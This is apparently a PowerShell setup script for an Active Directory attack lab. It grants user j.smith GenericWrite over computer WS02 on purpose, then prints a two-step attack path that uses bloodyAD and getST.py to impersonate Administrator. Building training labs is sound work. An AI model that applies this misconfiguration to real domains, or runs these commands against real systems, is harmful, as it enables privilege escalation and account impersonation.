Write-Host "============================================" -ForegroundColor Yellow
Write-Host "  AD Attack Lab - WS02 / 04_acl_genericwrite.ps1" -ForegroundColor Yellow
Write-Host "  Solo para uso en laboratorio controlado" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Yellow

Write-Host "`n[BLOQUE 4] Configurando ACL GenericWrite..." -ForegroundColor Cyan

$DCSession = New-PSSession -ComputerName "10.10.10.10" `
    -Credential (Get-Credential -Message "Credenciales Domain Admin" -UserName "CORP\Administrator")

Invoke-Command -Session $DCSession -ScriptBlock {
    Import-Module ActiveDirectory
    $jSmith = Get-ADUser -Identity "j.smith"
    $ws02   = Get-ADComputer -Identity "WS02"

    $acl = Get-Acl "AD:$($ws02.DistinguishedName)"
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $jSmith.SID,
        "GenericWrite",
        "Allow"
    )
    $acl.AddAccessRule($ace)
    Set-Acl "AD:$($ws02.DistinguishedName)" $acl
    Write-Host "[!] MISCONFIGURACION: j.smith tiene GenericWrite sobre WS02" -ForegroundColor Red
}

Write-Host ""
Write-Host "[+] ACL GenericWrite configurada" -ForegroundColor Green
Write-Host ""
Write-Host "Attack path GenericWrite:" -ForegroundColor White
Write-Host "  bloodyAD -u j.smith -p Password123! --host 10.10.10.10 setAttribute WS02 servicePrincipalName fake/spn" -ForegroundColor Gray
Write-Host "  getST.py -spn fake/spn -impersonate Administrator corp.local/j.smith:Password123!" -ForegroundColor Gray
Write-Host ""
Write-Host "Siguiente paso: correr 05_network_misconfigs.ps1" -ForegroundColor Cyan
